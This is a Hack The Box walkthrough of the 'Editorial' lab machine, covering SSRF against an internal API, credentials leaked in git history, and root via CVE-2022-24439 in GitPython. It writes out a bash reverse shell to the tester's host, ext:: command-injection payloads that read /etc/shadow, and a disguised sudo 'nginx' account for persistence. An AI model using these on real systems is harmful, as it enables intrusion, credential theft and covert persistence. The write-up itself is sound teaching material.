+++
tags = ["Box", "HTB", "Easy", "Linux", "Web", "API", "git", "CVE-2022-24439"]
draft = false
title = "Editorial HTB Walkthrough"
author = "bloodstiller"
date = 2024-12-22
+++

## Editorial Hack The Box Walkthrough/Writeup: {#editorial-hack-the-box-walkthrough-writeup}

-   <https://app.hackthebox.com/machines/Editorial>


## How I use variables &amp; Wordlists: {#how-i-use-variables-and-wordlists}

-   **Variables**:
    -   In my commands you are going to see me use `$box`, `$user`, `$hash`, `$domain`, `$pass` often.
        -   I find the easiest way to eliminate type-os &amp; to streamline my process it is easier to store important information in variables &amp; aliases.
            -   `$box` = The IP of the box
            -   `$pass` = Passwords I have access to.
            -   `$user` = current user I am enumerating with.
                -   Depending on where I am in the process this can change if I move laterally.
            -   `$domain` = the domain name e.g. `sugarape.local` or `contoso.local`
            -   `$machine` = the machine name e.g. `DC01`
        -   Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information.

-   **Wordlists**:
    -   I have symlinks all setup so I can get to my passwords from `~/Wordlists` so if you see me using that path that's why. If you are on Kali and following on, you will need to go to `/usr/share/wordlists`
        -   I also use these additional wordlists:
            -   [Statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)
            -   [SecLists](https://github.com/danielmiessler/SecLists)
            -   [Auto_Wordlists](https://github.com/carlospolop/Auto_Wordlists)


## 1. Enumeration: {#1-dot-enumeration}


### NMAP: {#nmap}


#### Basic Scans: {#basic-scans}

-   **Basic TCP Scan**:
    -   `nmap $box -oA TCPbasicScan`
        ```shell
        kali in HTB/BlogEntriesMade/Editorial/scans/nmap  🍣 main 🛤️  ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 11:52:10 zsh ❯ nmap $box -oA TCPbasicScan
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 11:52 GMT
        Nmap scan report for 10.129.206.26
        Host is up (0.043s latency).
        Not shown: 998 closed tcp ports (reset)
        PORT   STATE SERVICE
        22/tcp open  ssh
        80/tcp open  http

        Nmap done: 1 IP address (1 host up) scanned in 0.95 seconds

        ```
    -   **Initial thoughts**:
        -   SSH &amp; Web.


#### Comprehensive Scans: {#comprehensive-scans}

-   **In depth scan TCP**:
    -   `sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP`
        ```shell
          kali in HTB/BlogEntriesMade/Editorial/scans/nmap  🍣 main 🛤️  ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
          🕙 11:52:18 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping $box -oA FullTCP
          Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-21 11:52 GMT
          Nmap scan report for 10.129.206.26
          Host is up (0.039s latency).
          Not shown: 65533 closed tcp ports (reset)
          PORT   STATE SERVICE VERSION
          22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
          | ssh-hostkey:
          |   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
          |_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
          80/tcp open  http    nginx 1.18.0 (Ubuntu)
          |_http-server-header: nginx/1.18.0 (Ubuntu)
          |_http-title: Did not follow redirect to http://editorial.htb
          No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
          TCP/IP fingerprint:
          OS:SCAN(V=7.94SVN%E=4%D=12/21%OT=22%CT=1%CU=33625%PV=Y%DS=2%DC=I%G=Y%TM=676
          OS:6AC33%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A
          OS:)OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53
          OS:CST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88
          OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+
          OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
          OS:T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A
          OS:=Z%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
          OS:K=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

          Network Distance: 2 hops
          Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

          OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
          Nmap done: 1 IP address (1 host up) scanned in 35.24 seconds

        ```
    -   **Findings**:
        -   We can see the domain is `editorial.htb`. I add this to `/etc/hosts`

-   **Updated Domain &amp; Machine Variables for Testing**:
    -   Now that I have this information, I can update the `domain` and `machine` variables used in tests:
        -   `update_var domain "editorial.htb"`
        -   `update_var machine "editorial"`

-   **Updating** `/etc/hosts` **for DNS**
    -   I update my `/etc/hosts` file:
        -   `echo "$box   $domain $machine.$domain" | sudo tee -a /etc/hosts`


### Web `80`: {#web-80}

-   **Web Enumeration via Burp Suite**:
    -   When enumerating a website, always use Burp Suite. This allows you to:
    -   Record all potential injection points.
    -   Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress.


#### Whatweb: {#whatweb}

-   Lets run "whatweb" to see if we can glean some further information:
    -   `whatweb $box`
        ```shell
        kali in HTB/BlogEntriesMade/Editorial/scans/nmap  🍣 main 🛤️  ×1 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh
        🕙 11:55:43 zsh ❯ whatweb $box
        http://10.129.206.26 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.206.26], RedirectLocation[http://editorial.htb], Title[301 Moved Permanently], nginx[1.18.0]

        http://editorial.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.206.26], Title[Editorial Tiempo Arriba], X-UA-Compatible[IE=edge], nginx[1.18.0]
        ```

        -   Nothing especially interesting, we can see the site is using HTML5, nginx 1.18.0 and bootstrap.


#### Dirbusting the webserver using ffuf: {#dirbusting-the-webserver-using-ffuf}

-   **I Perform some directory busting to see if there are any interesting directories**:
    -   `ffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$domain/FUZZ -fc 403 -ic`
        -   But there was only `upload` &amp; `about`


#### Visiting the web page: {#visiting-the-web-page}

-   It's always good to just manually click around and manually enumerate the pages available.
    -   {{< figure src="/ox-hugo/2024-12-21-120126_.png" >}}
    -   It appears to be a publishing website.

-   Looking at the `/about` page we can see there is an email present `submissions@tiempoarriba.htb`
    -   Let's keep track of this as it may come in use later.


#### Enumerating the "Publish With Us" page for injection points: {#enumerating-the-publish-with-us-page-for-injection-points}

-   We can see that the "Publish With Us" allows us to uplaod a file as well as enter a url for the Cover. Lets test these injection points.
-   {{< figure src="/ox-hugo/2024-12-21-120159_.png" >}}

-   I fill it with the following details to see the response:
    -   I setup a simple python webserver on my host and enter this address as the URL cover url to see if I can have the site actively call out to this address.
    -   I add a simple `.php` webshell
        -   {{< figure src="/ox-hugo/2024-12-21-133315_.png" >}}

    -   I hit the "Preview" button.
        -   As we can see it does in fact call out and connect to our server.
        -   {{< figure src="/ox-hugo/2024-12-21-133406_.png" >}}
        -   Looking at the response for the request in burp we can see we are provided a url for a `static/uploads` folder and then a GUID of the uploaded file. We can also see that there is no file restrictions on the uploaded file. So we can pass our shell.php file.
            -   {{< figure src="/ox-hugo/2024-12-21-135704_.png" >}}
        -   I navigate to the url but cannot access it:
            -   {{< figure src="/ox-hugo/2024-12-21-135613_.png" >}}

    -   I pass the url with the GUID as the cover url &amp; supply a command "whoami" to see if we can access it via SSRF and have our commands trigger but it does not work.
        -   {{< figure src="/ox-hugo/2024-12-21-140132_.png" >}}

<!--listend-->

-   For the remaining fields I prefix with "test" and then the description of the field. (I do this as I want see how they are processed and possible rendered once I hit "Send Book Info")


### Fuzzing for SSRF with ffuf: {#fuzzing-for-ssrf-with-ffuf}

As we know the server will try and connect to an endpoint we can fuzz on localhost (127.0.01) for SSRF, by performing a port scan on the host. This will tell us if we can access any locally running services on the host and at the same time if SSRF is a viable path.

-   I use the copy as curl command option in burp to copy my `POST` request:
    -   {{< figure src="/ox-hugo/2024-12-21-142424_.png" >}}
    -   +Note+: I verified I could still enter a url without uploading a file and it reach out to my python server and it worked as expected.

-   I create a port list to use:
    ```shell
    seq 1 65535 > Ports.txt
    ```

    -   I modify the curl command so it can be used with ffuf:
        -   adding the wordlist `-w`
        -   specifying the url `-u`
        -   adding the injection point:
            -   `http://127.0.0.1:FUZZ`
        -   Removing the newlines and making 1 line
        -   Proxying all traffic via burp
            -   `-x http://127.0.0.1:8080`
        -   Remove size of 61 `-fs 61`
            -   This can only be done once we have the initial response so we can then filter for the standard response.

<!--listend-->

```shell
ffuf -w ~/Wordlists/45.06-CustomWordlists/Ports.txt -u 'http://editorial.htb/upload-cover' -X $'POST' -H $'Host: editorial.htb' -H $'Content-Length: 315' -H $'Accept-Language: en-US,en;q=0.9' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36' -H $'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAKLIgaiMMQNJmTJ6' -H $'Accept: */*' -H $'Origin: http://editorial.htb' -H $'Referer: http://editorial.htb/upload' -H $'Accept-Encoding: gzip, deflate, br' -H $'Connection: keep-alive' -d $'------WebKitFormBoundaryAKLIgaiMMQNJmTJ6\x0d\x0aContent-Disposition: form-data; name=\"bookurl\"\x0d\x0a\x0d\x0ahttp://127.0.0.1:FUZZ\x0d\x0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6\x0d\x0aContent-Disposition: form-data; name=\"bookfile\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a------WebKitFormBoundaryAKLIgaiMMQNJmTJ6--\x0d\x0a' -x http://127.0.0.1:8080 -fs 61
```

-   I have added the image of the command below as I know sometimes the formatting of my site can lead to the code boxes running off of the page. (will fix, soz bbz)
    -   {{< figure src="/ox-hugo/2024-12-21-143308_.png" >}}

-   We get a hit on port `5000`:
    -   {{< figure src="/ox-hugo/2024-12-21-143455_.png" >}}


### Abusing SSRF To Access Internal API Endpoints: {#abusing-ssrf-to-access-internal-api-endpoints}

-   I enter this IP into the url box and we can see we are given the `static/upload/GUID` response again:
    -   {{< figure src="/ox-hugo/2024-12-21-145805_.png" >}}

-   I enter the url into my browser and the file downloads. When I look at the file it looks to be API information in `json` format:
    -   {{< figure src="/ox-hugo/2024-12-21-150020_.png" >}}

-   Looking at the contents we can see it's information on an API running on the 5000 endpoint:
    -   {{< figure src="/ox-hugo/2024-12-21-150526_.png" >}}

-   I load these endpoints into burp intruder and query each endpoint
    -   {{< figure src="/ox-hugo/2024-12-21-151804_.png" >}}
    -   +Note+: I tried this but for some reason when I attempted to download the returned files it would always fail. Instead I manually queried the endpoint, quickly extracted the string and downloaded the file. There may be a time limit on the files uploaded potentially.


### Retrieving default credentials from the "authors" API endpoint: {#retrieving-default-credentials-from-the-authors-api-endpoint}

-   The endpoint `http://127.0.0.1:5000/api/latest/metadata/messages/authors` contained the following message which appears to be sent to new authors &amp; it contained default creds:
    -   {{< figure src="/ox-hugo/2024-12-21-155343_.png" >}}
    -   `dev:dev080217_devAPI!@`


## 2. Foothold: {#2-dot-foothold}


### Accessing the host by SSH as dev: {#accessing-the-host-by-ssh-as-dev}

-   I try these on the ssh service &amp; they work:
    -   {{< figure src="/ox-hugo/2024-12-21-155513_.png" >}}

-   Lets get our flag:
    -   {{< figure src="/ox-hugo/2024-12-22-053332_.png" >}}


### Enumerating the host as dev: {#enumerating-the-host-as-dev}


#### Running Linpeas: {#running-linpeas}

-   I transfer linpeas over using a simple python http server.
    -   On my attack host:
        -   On my host I navigate to where I have the `linpeas.sh` file stored.
        -   I run `python -m http.server 9000`
    -   On the target
        -   I navigate to `/tmp` as it's always world writable.
        -   I transfer the file using wget.
            -   `wget http://10.10.14.80:9000/linpeas.sh`
            -   {{< figure src="/ox-hugo/2024-12-22-054131_.png" >}}
        -   Make it executable `chmod +x linpeas.sh`
        -   Run it `./linpeas.sh`
-   It finds nothing of note.


#### Finding prod user password in git commits: {#finding-prod-user-password-in-git-commits}

-   Looking at our users home folder we can see they have an `apps` folder however it is empty.
-   Looking further we can see it has a `.git` folder, meaning this was once at some point initialized as a git repo or was intended to be a git repo, which means either files have been deleted or never added. Luckily we can query the `.git` logs to check if files were ever present.

-   I run `git log --oneline` and we are shown a list of previous commits, which means this was an active repo but the files have since been deleted. On the left hand side we can see the git commit hash and to the right the commit message supplied by the user for the commit.
    -   {{< figure src="/ox-hugo/2024-12-22-065734_.png" >}}

-   Looking at the commit messages we can see an interesting one "downgrading prod to dev", now given we were able to retrieve clear text passwords from the API endpoint previously I would imagine we can find clear text creds for prod here too.
    -   {{< figure src="/ox-hugo/2024-12-22-065911_.png" >}}

-   I use `git log -p b73481b` to read the changes.
    -   {{< figure src="/ox-hugo/2024-12-22-071238_.png" >}}

-   Looking at the changes we can see the following. The text in red signifies it was deleted and the text in green signifies it was added &amp; looking at the contents we can see it contains clear text creds for the prod account.
    -   {{< figure src="/ox-hugo/2024-12-22-071308_.png" >}}
    -   `prod:080217_Producti0n_2023!@`


## 3. Lateral Movement: {#3-dot-lateral-movement}


### Enumerating as prod: {#enumerating-as-prod}

-   I su user to prod and it works.
    -   {{< figure src="/ox-hugo/2024-12-22-071534_.png" >}}

-   I check what `sudo` command's prod can run if any:
    -   {{< figure src="/ox-hugo/2024-12-22-071712_.png" >}}
    -   We can see that we can run python3 as sudo and run the script `/opt/internal_apps/clone_changes/clone_prod_change.py` the fact the script is followed by the wildcard symbol `*` implies we can pass any arguments to this script and have it run as root

-   Reading the contents of the script we can see it contains the following code:
    ```python
    #!/usr/bin/python3
    import o        s
    import sys
    from git import Repo

    os.chdir('/opt/internal_apps/clone_changes')

    url_to_clone = sys.argv[1]

    r = Repo.init('', bare=True)
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
    ```

    -   This all looks pretty standard. We import OS, to interact with the operating system &amp; sys to take cli args for the script. We then import Repo from Git.


#### Code Breakdown and explanation of vulnerability: {#code-breakdown-and-explanation-of-vulnerability}

1.  **Imports and Setup**:
    ```python
    import sys
    from git import Repo
    import os
    ```

    -   `sys`: Used to access command-line arguments.
    -   `git.Repo`: From the GitPython library, allows interaction with Git repositories.
    -   `os`: Used to interact with the host os.
2.  **Change Working Directory**:
    ```python
    os.chdir('/opt/internal_apps/clone_changes')
    ```

    -   Changes the current working directory to `/opt/internal_apps/clone_changes`.
    -   This ensures that subsequent operations (e.g., creating or cloning repositories) occur in this directory.

3.  **Command-Line Argument Handling**:
    ```python
    url_to_clone = sys.argv[1]
    ```

    -   `sys.argv[1]`: Takes the first command-line argument after the script name as the URL of the repository to be cloned.

4.  **Initialize Bare Git Repository**:
    ```python
    r = Repo.init('', bare=True)
    ```

    -   `Repo.init('', bare=True)`: Initializes a new bare Git repository in the current directory ('' refers to the current path).
        -   A bare repository has no working tree and is typically used as a remote/shared repository.

5.  **Clone a Repository**:
    ```python
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])

    ```

    -   `r.clone_from(url_to_clone, 'new_changes')`: Clones the repository from url_to_clone into a directory named new_changes within the current working directory.
    -   `multi_options=["-c protocol.ext.allow=always"]`: Adds a Git configuration option:
        -   `-c protocol.ext.allow=always`: Allows the `protocol.ext transport`, enabling custom protocol handlers.

6.  **What does that mean in english? Here's a simpler explanation**:
    For the most part the script is very simple, it takes a supplied git repo as an argument and will clone it into a directory called new_changes with the current working directory. However the temporary addition being added is an issue as it allows us to execute code on the host.
    1.  What does `multi_options=["-c protocol.ext.allow=always"]` do?
        -   It adds a temporary configuration to the Git command being run by the script.
    2.  What is `protocol.ext?`
        -   It's a Git feature that allows you to define custom commands or handlers for specific types of repository URLs.
    3.  What does `-c protocol.ext.allow=always` mean?
        -   It tells Git: "It's okay to run custom commands whenever a repository URL starts with `ext::`."
    4.  **Why is this important**?
        -   Normally, Git disables this feature because it can be dangerous. Because it allows us to provide an argument like the below and have it execute on the host system. And as we are allowed to execute this script as root our commands will run as root!
        -   e.g. `ext::sh -c 'cat //root//.ssh/id_rsa'`
        -   If we google "GitPython rce" we find [CVE-2022-24439](https://www.cve.org/CVERecord?id=CVE-2022-24439).


## 4. Privilege Escalation: {#4-dot-privilege-escalation}


### Using CVE-2022-24439 GitPython Vulnerability to get a root shell. {#using-cve-2022-24439-gitpython-vulnerability-to-get-a-root-shell-dot}

-   Initially I check if `nc` is installed and it is however it has been compiled without the `-c` or `-e` flags so we cannot use it for reverse shell.
    -   {{< figure src="/ox-hugo/2024-12-22-083007_.png" >}}

-   This means we will need to use a bash shell. I run the following command to create a bash shell in the `/tmp/` folder:
    -   `echo "bash -i >& /dev/tcp/10.10.14.80/80 0>&1" >> /tmp/notashell.sh`

-   I start my listener:
    -   `rlwrap -cAr nc -nvlp 80`

-   Run the python script whilst passing the shell as an argument:
    ```shell
    sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c bash% /tmp/notashell.sh'
    ```

    -   {{< figure src="/ox-hugo/2024-12-22-084600_.png" >}}

-   Get our root flag:
    -   {{< figure src="/ox-hugo/2024-12-22-084641_.png" >}}


### Why do we need the `%` sign after bash: {#why-do-we-need-the-sign-after-bash}

-   So this was annoying me for sometime and I looked into it, every-time there is a space we need to supply the `%` to escape due to how `argv` handles special characters.
-   For instance we can read `/etc/shadow` by copying it to `/tmp/shad` by doing this:
    ```shell
    sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /etc/shadow% >>% /tmp/shad'
    ```

    -   We can then see if we navigate to `/tmp` we can read the file.
        -   {{< figure src="/ox-hugo/2024-12-22-085121_.png" >}}

    <!--listend-->

    -   This means any command can be run provided any spaces are followed by `%` symbol.
        -   Read the root flag this way:
            ```shell
            sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >>% /tmp/root.flag'
            ```

            -   {{< figure src="/ox-hugo/2024-12-22-085355_.png" >}}


## 5. Persistence: {#5-dot-persistence}


### Creating a high privileged "service" account for persistence: {#creating-a-high-privileged-service-account-for-persistence}

-   I create an account called "nginx" and give myself root privileges &amp; access to the bash shell. I use this name as it's one you could see on a machine and will raise less suspicion.

-   {{< figure src="/ox-hugo/2024-12-22-090631_.png" >}}
    -   `sudo useradd -m -s /bin/bash nginx`
        -   Creates a new user named `nginx`.
        -   `-m`: Creates a home directory for the user.
        -   `-s /bin/bash`: Sets the user's default shell to `/bin/bash`.

    -   `sudo usermod -aG sudo nginx`
        -   Adds the `nginx` user to the `sudo` group.
        -   `-a`: Appends the user to the group (avoids overwriting existing groups).
        -   `-G sudo`: Specifies the `sudo` group.

    -   `sudo passwd nginx`
        -   Sets or updates the password for the `nginx` user.
        -   Prompts us to add a new password and confirms it.

-   I switch to the newly created user
    -   {{< figure src="/ox-hugo/2024-12-22-090700_.png" >}}

-   I check we have sudo privileges, as expected we do.
    -   {{< figure src="/ox-hugo/2024-12-22-090731_.png" >}}

-   I ensure we can actually read sudo level files by reading `/etc/shadow`
    -   {{< figure src="/ox-hugo/2024-12-22-090801_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned about retrieving data from git logs.
2.  I learned about the python git vulnerability CVE-2022-24439:


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Oh I did not use a forward slash at one point in a command and that was stumping reading the API endpoints at one point, that was fun.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


